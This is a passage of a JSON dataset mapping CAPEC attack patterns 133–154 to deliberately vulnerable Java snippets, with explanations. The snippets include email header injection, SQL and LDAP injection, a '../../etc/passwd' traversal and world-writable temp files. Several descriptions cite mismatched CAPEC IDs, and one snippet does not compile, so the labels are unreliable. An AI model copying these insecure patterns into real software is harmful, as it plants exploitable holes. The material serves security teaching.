        "code_snippet": "public class Application {\n    public static void main(String[] args) {\n        for (String arg : args) {\n            switch (arg) {\n                case \"--debug\":\n                    enableDebugMode();\n                    break;\n                case \"--verbose\":\n                    enableVerboseMode();\n                    break;\n                case \"--hidden\":\n                    enableHiddenFeature();\n                    break;\n                default:\n                    System.out.println(\"Unknown option: \" + arg);\n            }\n        }\n    }\n\n    private static void enableDebugMode() {\n        System.out.println(\"Debug mode enabled\");\n        // Debug information that might reveal sensitive data\n    }\n\n    private static void enableVerboseMode() {\n        System.out.println(\"Verbose mode enabled\");\n        // Verbose logging\n    }\n\n    private static void enableHiddenFeature() {\n        System.out.println(\"Hidden feature enabled\");\n        // Hidden functionality that should not be accessible\n    }\n}",
        "description": "This Java code snippet represents an application that processes command-line arguments to enable various modes, including a hidden feature. The main idea of the CAPEC 'Try All Common Switches' is embodied here, as an attacker could try different switches (--debug, --verbose, --hidden) to discover hidden or undocumented functionality. The related CWEs are demonstrated as follows: CWE-912 (Hidden Functionality) is shown by the --hidden switch, CWE-184 (Incomplete List of Disallowed Inputs) is implied by the lack of validation for unexpected inputs, and CWE-391 (Unchecked Error Condition) is represented by the lack of error handling for unknown options. This code highlights the risk of exposing sensitive or undocumented features through common switches."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "import java.util.Properties;\nimport javax.mail.*;\nimport javax.mail.internet.*;\n\npublic class EmailInjectionExample {\n    public static void main(String[] args) {\n        String to = \"victim@example.com\";\n        String subject = \"Hello\";\n        String body = \"This is a test email.\";\n        String maliciousInput = \"\\r\\nBCC: attacker@example.com\";\n\n        sendEmail(to, subject, body + maliciousInput);\n    }\n\n    public static void sendEmail(String to, String subject, String body) {\n        String from = \"attacker@example.com\";\n        String host = \"smtp.example.com\";\n\n        Properties properties = System.getProperties();\n        properties.setProperty(\"mail.smtp.host\", host);\n\n        Session session = Session.getDefaultInstance(properties);\n\n        try {\n            MimeMessage message = new MimeMessage(session);\n            message.setFrom(new InternetAddress(from));\n            message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));\n            message.setSubject(subject);\n            message.setText(body);\n\n            Transport.send(message);\n            System.out.println(\"Sent message successfully....\");\n        } catch (MessagingException mex) {\n            mex.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an email injection vulnerability. The `sendEmail` method constructs an email message using input parameters for the recipient, subject, and body. The `maliciousInput` string contains CRLF sequences (`\\r\\n`) that can manipulate email headers, such as adding a BCC field to send a copy to an attacker. This example highlights the improper neutralization of special elements (CWE-150, CWE-116, CWE-147, CWE-113) and the potential for command injection (CWE-77) by not sanitizing or encoding user input properly. The code represents the main idea of CAPEC-139 (Email Injection) by showing how an adversary can manipulate email headers and content through delimiter characters."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "import java.util.Scanner;\n\npublic class FormatStringVulnerability {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your name:\");\n        String userInput = scanner.nextLine();\n        \n        // Vulnerable code: using user input directly in format string\n        System.out.printf(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a format string injection vulnerability. The program prompts the user to enter their name and then uses the user-provided input directly in a printf statement. This is dangerous because if the user input contains format specifiers (e.g., %s, %n), it can lead to unexpected behavior, such as reading or writing to memory locations. This vulnerability arises from the use of an externally-controlled format string (CWE-134) without proper input validation (CWE-20, CWE-1286) or neutralization of special elements (CWE-74). The code does not restrict the use of dynamically-identified variables (CWE-914), making it susceptible to exploitation."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "import javax.naming.Context;\nimport javax.naming.InitialContext;\nimport javax.naming.NamingException;\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.InitialDirContext;\nimport javax.naming.directory.SearchControls;\nimport javax.naming.directory.SearchResult;\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.SearchControls;\nimport javax.naming.directory.SearchResult;\nimport java.util.Hashtable;\n\npublic class LDAPInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"(uid=*\")\"; // Malicious input\n        String ldapSearchBase = \"ou=users,dc=example,dc=com\";\n        String ldapSearchFilter = \"(uid=\" + userInput + \")\";\n\n        Hashtable<String, String> env = new Hashtable<String, String>();\n        env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\n        env.put(Context.PROVIDER_URL, \"ldap://localhost:389\");\n\n        try {\n            DirContext ctx = new InitialDirContext(env);\n            SearchControls searchControls = new SearchControls();\n            searchControls.setSearchScope(SearchControls.SUBTREE_SCOPE);\n\n            // Vulnerable LDAP query\n            NamingEnumeration<SearchResult> results = ctx.search(ldapSearchBase, ldapSearchFilter, searchControls);\n\n            while (results.hasMore()) {\n                SearchResult searchResult = results.next();\n                System.out.println(\"Found: \" + searchResult.getNameInNamespace());\n            }\n        } catch (NamingException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable LDAP query that is susceptible to LDAP Injection. The code constructs an LDAP search filter using user input without proper validation or neutralization of special characters. The user input is directly concatenated into the LDAP search filter, allowing an attacker to manipulate the query. In this example, the user input is set to a malicious value \"(uid=*)\", which could potentially return all user entries in the LDAP directory. This vulnerability is similar to SQL Injection and other injection attacks, where improper handling of user input can lead to unauthorized access or disclosure of sensitive information."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableServlet\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        String query = \"SELECT * FROM users WHERE username='\" + userInput + \"'\";\n        // Execute the query (this is just a placeholder, actual database code is omitted)\n        // db.executeQuery(query);\n        response.getWriter().println(\"Query: \" + query);\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to Parameter Injection (CAPEC-137). The servlet takes a user input from an HTTP GET request parameter named 'input' and directly incorporates it into an SQL query string without proper validation or encoding. This can lead to SQL Injection attacks if an attacker manipulates the input to include special characters or SQL commands. For example, if the input is 'admin' or '1'='1', the resulting query would be 'SELECT * FROM users WHERE username='admin' or '1'='1'', which could allow unauthorized access to user data. This code snippet also touches on related CWEs such as CWE-88 (Improper Neutralization of Argument Delimiters in a Command) and CWE-116 (Improper Encoding or Escaping of Output), highlighting the importance of proper input validation and encoding to prevent injection attacks."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "import java.lang.reflect.Method;\n\npublic class ReflectionInjectionExample {\n    public static void main(String[] args) {\n        if (args.length < 2) {\n            System.out.println(\"Usage: java ReflectionInjectionExample <className> <methodName>\");\n            return;\n        }\n\n        String className = args[0];\n        String methodName = args[1];\n\n        try {\n            // Load the class dynamically based on user input\n            Class<?> cls = Class.forName(className);\n\n            // Get the method dynamically based on user input\n            Method method = cls.getMethod(methodName);\n\n            // Invoke the method (assuming it is static and takes no parameters for simplicity)\n            method.invoke(null);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a reflection injection vulnerability. The program takes two command-line arguments: the name of a class and the name of a method. It then uses Java's reflection API to dynamically load the specified class and invoke the specified method. This is a direct implementation of the 'Reflection Injection' CAPEC, where an adversary can control the input to reflection methods, potentially causing the application to invoke unintended methods or load malicious classes. This can lead to various security issues such as unauthorized access, data leakage, or even full control over the application. The related CWEs highlight the risks of using externally-controlled input for selecting classes or code, and the potential for injection attacks if special elements are not properly neutralized."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "import java.io.*;\n\npublic class PathTraversalExample {\n    public static void main(String[] args) {\n        String userInput = \"../../etc/passwd\"; // Simulated user input\n        String basePath = \"/var/www/html/\";\n        \n        // Vulnerable code: concatenating user input directly to the base path\n        File file = new File(basePath + userInput);\n        \n        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a relative path traversal vulnerability. The code takes a user-supplied input (simulated as \"../../etc/passwd\") and concatenates it directly to a base path (\"/var/www/html/\"). This allows an attacker to traverse directories and access arbitrary files outside the intended directory. The code then attempts to read and print the contents of the file specified by the constructed path. This example embodies the main idea of CAPEC-126 (Relative Path Traversal) and highlights the associated CWEs, such as CWE-23, CWE-22, CWE-35, CWE-24, and CWE-34, by showing how improper input validation can lead to unauthorized file access."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class MultiFormServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String step = request.getParameter(\"step\");\n        HttpSession session = request.getSession();\n\n        if (step == null) {\n            response.sendRedirect(\"form1.jsp\");\n            return;\n        }\n\n        switch (step) {\n            case \"1\":\n                session.setAttribute(\"form1Data\", request.getParameter(\"form1Data\"));\n                response.sendRedirect(\"form2.jsp\");\n                break;\n            case \"2\":\n                if (session.getAttribute(\"form1Data\") == null) {\n                    response.sendRedirect(\"form1.jsp\");\n                    return;\n                }\n                session.setAttribute(\"form2Data\", request.getParameter(\"form2Data\"));\n                response.sendRedirect(\"form3.jsp\");\n                break;\n            case \"3\":\n                if (session.getAttribute(\"form1Data\") == null || session.getAttribute(\"form2Data\") == null) {\n                    response.sendRedirect(\"form1.jsp\");\n                    return;\n                }\n                session.setAttribute(\"form3Data\", request.getParameter(\"form3Data\"));\n                response.sendRedirect(\"summary.jsp\");\n                break;\n            default:\n                response.sendRedirect(\"form1.jsp\");\n                break;\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a multi-step form submission process vulnerable to the 'Bypassing of Intermediate Forms in Multiple-Form Sets' attack. The code uses HTTP session attributes to store data from each form step. However, it only checks for the presence of data from previous steps without verifying the integrity or completeness of the data. This allows an attacker to bypass intermediate forms by directly navigating to later steps (e.g., by setting the 'step' parameter to '2' or '3' without completing previous steps). This vulnerability is related to CWE-372 (Incomplete Internal State Distinction) and CWE-807 (Reliance on Untrusted Inputs in a Security Decision), as the application incorrectly assumes the state based on untrusted input."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class CachePoisoningExample {\n    private static Map<String, String> cache = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate fetching data from a less trusted source\n        String data = fetchDataFromUntrustedSource(\"key1\");\n        cache.put(\"key1\", data);\n\n        // Simulate fetching data from a trusted source\n        String trustedData = fetchDataFromTrustedSource(\"key1\");\n        cache.put(\"key1\", trustedData);\n\n        // Accessing the cache\n        String cachedData = cache.get(\"key1\");\n        System.out.println(\"Cached Data: \" + cachedData);\n    }\n\n    private static String fetchDataFromUntrustedSource(String key) {\n        // Simulate untrusted data\n        return \"untrusted_data\";\n    }\n\n    private static String fetchDataFromTrustedSource(String key) {\n        // Simulate trusted data\n        return \"trusted_data\";\n    }\n}",
        "description": "This Java code snippet demonstrates a simple cache poisoning scenario. The cache is a HashMap that stores key-value pairs. The `fetchDataFromUntrustedSource` method simulates fetching data from a less trusted source, while the `fetchDataFromTrustedSource` method simulates fetching data from a trusted source. The cache is first populated with untrusted data and then with trusted data. However, due to the lack of proper verification and origin validation, the cache can be poisoned with untrusted data. This example embodies the main idea of CAPEC-111 (Cache Poisoning) and highlights related CWEs such as CWE-348 (Use of Less Trusted Source), CWE-345 (Insufficient Verification of Data Authenticity), and CWE-346 (Origin Validation Error)."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class DNSCachePoisoningExample {\n    private static Map<String, String> dnsCache = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate adding a trusted DNS entry\n        dnsCache.put(\"www.example.com\", \"93.184.216.34\");\n\n        // Simulate a DNS cache poisoning attack\n        dnsCache.put(\"www.example.com\", \"192.168.1.100\");\n\n        // Attempt to resolve the domain name\n        String ipAddress = resolveDomain(\"www.example.com\");\n        System.out.println(\"Resolved IP Address: \" + ipAddress);\n    }\n\n    public static String resolveDomain(String domain) {\n        // Insufficient verification of data authenticity (CWE-345)\n        if (dnsCache.containsKey(domain)) {\n            return dnsCache.get(domain);\n        }\n\n        try {\n            // Use of less trusted source (CWE-348)\n            InetAddress inetAddress = InetAddress.getByName(domain);\n            return inetAddress.getHostAddress();\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of DNS cache poisoning. The `dnsCache` map simulates a DNS cache where domain names are mapped to IP addresses. Initially, a trusted DNS entry is added to the cache. However, an attacker can poison the cache by inserting a malicious entry, causing the domain 'www.example.com' to resolve to a malicious IP address ('192.168.1.100'). The `resolveDomain` method attempts to resolve the domain name using the cache first, which represents insufficient verification of data authenticity (CWE-345). If the domain is not found in the cache, it falls back to using a less trusted source (CWE-348) by querying the DNS server directly. This code highlights the vulnerability where an attacker can manipulate the DNS cache, leading to potential redirection of users to malicious sites."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class SensitiveFileServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = getServletContext().getRealPath(\"/sensitive-data/config.txt\");\n        File file = new File(filePath);\n        if (file.exists()) {\n            response.setContentType(\"text/plain\");\n            try (BufferedReader br = new BufferedReader(new FileReader(file))) {\n                String line;\n                while ((line = br.readLine()) != null) {\n                    response.getWriter().println(line);\n                }\n            }\n        } else {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND);\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where sensitive data is stored under the web root and can be accessed without proper authorization. The servlet serves a file located at '/sensitive-data/config.txt' directly to the client if it exists. This embodies the CAPEC idea of 'Detect Unpublicized Web Pages' by allowing an adversary to access sensitive information that was not intended to be publicized. The code also touches on related CWEs such as 'Direct Request (Forced Browsing)' (CWE-425) and 'Storage of File with Sensitive Data Under Web Root' (CWE-219) by not enforcing access control and storing sensitive data in a publicly accessible location."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/unpublishedService\")\npublic class UnpublishedService extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // No authentication or authorization checks\n        response.getWriter().append(\"Unpublished Service Accessed\");\n    }\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // No authentication or authorization checks\n        doGet(request, response);\n    }\n}\n\n// WSDL exposure\n@WebServlet(\"/wsdl\")\npublic class WSDLExposure extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.setContentType(\"text/xml\");\n        response.getWriter().append(\"<wsdl:definitions>...</wsdl:definitions>\");\n    }\n}\n\n// Code download without integrity check\n@WebServlet(\"/download\")\npublic class CodeDownload extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // No integrity check\n        response.setContentType(\"application/octet-stream\");\n        response.getWriter().append(\"// Malicious code\");\n    }\n}\n\n// Exposing version control repository\n@WebServlet(\"/repo\")\npublic class RepoExposure extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Exposing repository\n        response.setContentType(\"text/plain\");\n        response.getWriter().append(\"Repository content\");\n    }\n}\n\n// Omission of security-relevant information\n@WebServlet(\"/log\")\npublic class LogOmission extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // No logging of security-relevant information\n        response.getWriter().append(\"Action performed\");\n    }\n}",
        "description": "This Java code snippet demonstrates a web application with several vulnerabilities related to the CAPEC 'Detect Unpublicized Web Services' and the associated CWEs. The code includes:\n\n1. An unpublished service (`UnpublishedService`) that lacks authentication and authorization checks, making it accessible to unauthorized users (CWE-425).\n2. A servlet (`WSDLExposure`) that exposes a WSDL file, potentially leaking sensitive information about the web services (CWE-651).\n3. A servlet (`CodeDownload`) that allows downloading code without performing an integrity check, which could lead to executing malicious code (CWE-494).\n4. A servlet (`RepoExposure`) that exposes the contents of a version control repository, making it accessible to unauthorized users (CWE-527).\n5. A servlet (`LogOmission`) that omits logging security-relevant information, making it difficult to detect and analyze attacks (CWE-223).\n\nThe code illustrates how an adversary could exploit these vulnerabilities to access unpublicized web services and other sensitive information."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Arrays;\n\npublic class ChecksumSpoofingExample {\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        String message = \"Sensitive data\";\n        String tamperedMessage = \"Tampered data\";\n\n        // Weak hash function (MD5) used for checksum\n        String checksum = generateChecksum(message);\n        System.out.println(\"Original Checksum: \" + checksum);\n\n        // Adversary modifies the message and generates a new checksum\n        String tamperedChecksum = generateChecksum(tamperedMessage);\n        System.out.println(\"Tampered Checksum: \" + tamperedChecksum);\n\n        // Simulate receiving the tampered message and checksum\n        if (verifyChecksum(tamperedMessage, tamperedChecksum)) {\n            System.out.println(\"Message integrity verified.\");\n        } else {\n            System.out.println(\"Message integrity compromised.\");\n        }\n    }\n\n    public static String generateChecksum(String data) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"MD5\"); // CWE-328: Use of Weak Hash\n        byte[] digest = md.digest(data.getBytes());\n        StringBuilder sb = new StringBuilder();\n        for (byte b : digest) {\n            sb.append(String.format(\"%02x\", b));\n        }\n        return sb.toString();\n    }\n\n    public static boolean verifyChecksum(String data, String checksum) throws NoSuchAlgorithmException {\n        String newChecksum = generateChecksum(data);\n        return newChecksum.equals(checksum); // CWE-354: Improper Validation of Integrity Check Value\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario of checksum spoofing. The code uses a weak hash function (MD5) to generate a checksum for a message, which is a common vulnerability (CWE-328: Use of Weak Hash). An adversary can modify the message and generate a new checksum to match the tampered message. The `verifyChecksum` method checks if the checksum of the received message matches the provided checksum, but since the checksum is weak and easily spoofed, it fails to ensure message integrity (CWE-354: Improper Validation of Integrity Check Value). This example highlights the importance of using strong cryptographic methods and proper validation to prevent checksum spoofing attacks."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "import javax.xml.XMLConstants;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.transform.dom.DOMSource;\nimport javax.xml.validation.Schema;\nimport javax.xml.validation.SchemaFactory;\nimport javax.xml.validation.Validator;\nimport org.w3c.dom.Document;\nimport java.io.File;\nimport java.io.IOException;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.SAXException;\n\npublic class XMLSchemaPoisoningExample {\n    public static void main(String[] args) {\n        try {\n            // Load XML file\n            File xmlFile = new File(\"data.xml\");\n            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();\n            Document doc = dBuilder.parse(xmlFile);\n\n            // Load external schema file (potentially poisoned)\n            File schemaFile = new File(\"schema.xsd\");\n            SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\n            Schema schema = schemaFactory.newSchema(schemaFile);\n\n            // Validate XML against the schema\n            Validator validator = schema.newValidator();\n            validator.validate(new DOMSource(doc));\n\n            System.out.println(\"XML is valid against the schema.\");\n        } catch (SAXException | IOException | ParserConfigurationException e) {\n            System.out.println(\"XML is not valid: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an XML file is validated against an external XML schema file. The code loads an XML document and an external schema file, then validates the XML against the schema. This setup is vulnerable to XML Schema Poisoning (CAPEC-170) because the schema file is externally controlled and could be maliciously modified. The related CWEs are represented as follows: CWE-15 (External Control of System or Configuration Setting) is shown by the external schema file being loaded, CWE-472 (External Control of Assumed-Immutable Web Parameter) is implied by the assumption that the schema file is immutable, CWE-112 (Missing XML Validation) is addressed by the validation step, and CWE-91 and CWE-643 (XML Injection and XPath Injection) are potential risks if the XML content is not properly sanitized before processing."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "import java.io.StringReader;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class XMLPingOfDeath {\n    public static void main(String[] args) {\n        String xmlMessage = \"<message>\" + \"<data>\" + \"A\".repeat(1000) + \"</data>\" + \"</message>\";\n        for (int i = 0; i < 100000; i++) {\n            processXML(xmlMessage);\n        }\n    }\n\n    public static void processXML(String xml) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(xml)));\n            // Simulate processing of the XML document\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an XML Ping of the Death attack. The main idea is to flood the target system with a large number of small XML messages, causing resource depletion and potentially leading to a denial of service. The `processXML` method simulates the processing of an XML message without any validation or throttling, embodying CWE-400 (Uncontrolled Resource Consumption) and CWE-770 (Allocation of Resources Without Limits or Throttling). The XML message is not validated against any schema, representing CWE-112 (Missing XML Validation). The loop in the `main` method sends a large number of XML messages in rapid succession, illustrating the attack's potential impact on system resources."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class ContentSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n\n            // Simulate content spoofing by modifying the content\n            String spoofedContent = content.toString().replace(\"Original Content\", \"Spoofed Content\");\n\n            // Display the spoofed content\n            System.out.println(spoofedContent);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of content spoofing. The program fetches content from a specified URL (http://example.com) and reads the content line by line. It then simulates content spoofing by replacing the text 'Original Content' with 'Spoofed Content'. Finally, it prints the modified content. This example embodies the main idea of CAPEC-139 (Content Spoofing) by showing how an adversary could modify the content of a web page while keeping the apparent source unchanged. The code also touches on related CWEs such as CWE-345 (Insufficient Verification of Data Authenticity) and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) by not verifying the authenticity or integrity of the fetched content."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.util.HashSet;\nimport java.util.Set;\n\npublic class InsecureTempFile {\n    public static void main(String[] args) {\n        try {\n            // Predictable temporary file name\n            String tempFileName = \"tempfile_\" + System.currentTimeMillis() + \".tmp\";\n            File tempFile = new File(\"/tmp/\" + tempFileName);\n\n            // Create the temporary file\n            if (tempFile.createNewFile()) {\n                System.out.println(\"Temporary file created: \" + tempFile.getAbsolutePath());\n\n                // Set insecure permissions (world-readable and writable)\n                Set<PosixFilePermission> perms = new HashSet<>();\n                perms.add(PosixFilePermission.OWNER_READ);\n                perms.add(PosixFilePermission.OWNER_WRITE);\n                perms.add(PosixFilePermission.GROUP_READ);\n                perms.add(PosixFilePermission.GROUP_WRITE);\n                perms.add(PosixFilePermission.OTHERS_READ);\n                perms.add(PosixFilePermission.OTHERS_WRITE);\n                Files.setPosixFilePermissions(Paths.get(tempFile.getAbsolutePath()), perms);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the creation of a temporary file with a predictable name in a directory with insecure permissions. The file is created in the '/tmp/' directory, which is commonly used for temporary files. The file name is generated using the current timestamp, making it somewhat predictable. After creating the file, the code sets insecure permissions, making the file world-readable and writable. This example embodies the main idea of CAPEC-61, 'Explore for Predictable Temporary File Names,' and highlights related weaknesses such as CWE-377 (Insecure Temporary File), CWE-378 (Creation of Temporary File With Insecure Permissions), and CWE-379 (Creation of Temporary File in Directory with Insecure Permissions). An attacker could exploit these vulnerabilities to access or manipulate the temporary file, leading to potential security breaches."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class SensitiveDataExposure {\n    public static void main(String[] args) {\n        // Example of a common resource location\n        String configFilePath = \"/etc/config.txt\";\n        File configFile = new File(configFilePath);\n\n        if (configFile.exists() && configFile.canRead()) {\n            try (FileInputStream fis = new FileInputStream(configFile)) {\n                byte[] data = new byte[(int) configFile.length()];\n                fis.read(data);\n                String configContent = new String(data, \"UTF-8\");\n                System.out.println(\"Config Content: \" + configContent);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"Config file is not accessible.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Collect Data from Common Resource Locations' (CAPEC-168). The code attempts to read a configuration file located at a well-known path ('/etc/config.txt') on a Unix system. If the file exists and is readable, it reads the file's content and prints it to the console. This example highlights the vulnerability where sensitive information stored in common locations can be accessed by unauthorized actors if proper access controls are not in place. The related CWEs provide additional context, such as the risk of making files accessible to external parties (CWE-552) and the importance of properly managing sensitive data (CWE-1323)."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class IdentitySpoofingExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n\n    static {\n        // Pre-populated user database with username and password\n        userDatabase.put(\"user1\", \"password1\");\n        userDatabase.put(\"user2\", \"password2\");\n    }\n\n    public static boolean authenticate(String username, String password) {\n        // Weak authentication: simply checks if the username exists and the password matches\n        return userDatabase.containsKey(username) && userDatabase.get(username).equals(password);\n    }\n\n    public static void main(String[] args) {\n        // Simulating an identity spoofing attack\n        String spoofedUsername = \"user1\";\n        String spoofedPassword = \"password1\";\n\n        if (authenticate(spoofedUsername, spoofedPassword)) {\n            System.out.println(\"Authentication successful for user: \" + spoofedUsername);\n        } else {\n            System.out.println(\"Authentication failed for user: \" + spoofedUsername);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple authentication mechanism that is vulnerable to identity spoofing attacks. The `authenticate` method checks if the provided username exists in the `userDatabase` and if the corresponding password matches. This represents CWE-287 (Improper Authentication) and CWE-1390 (Weak Authentication) as it does not sufficiently prove the claimed identity. The `main` method simulates an identity spoofing attack by using valid credentials of an existing user, which would allow an attacker to gain unauthorized access. This example highlights the importance of implementing robust authentication mechanisms to prevent identity spoofing."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "import java.util.Scanner;\n\npublic class InputValidationExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your age: \");\n        String input = scanner.nextLine();\n        int age = Integer.parseInt(input); // CWE-1287: Improper Validation of Specified Type of Input\n        if (age >= 18) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a common vulnerability related to improper input validation (CAPEC-153). The program prompts the user to enter their age and then attempts to parse the input directly to an integer without validating the input format or type (CWE-1287). If the user inputs a non-integer value, the program will throw a NumberFormatException, potentially leading to unexpected behavior or security issues. This example highlights the importance of validating input to ensure it meets the expected format and type before processing it."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
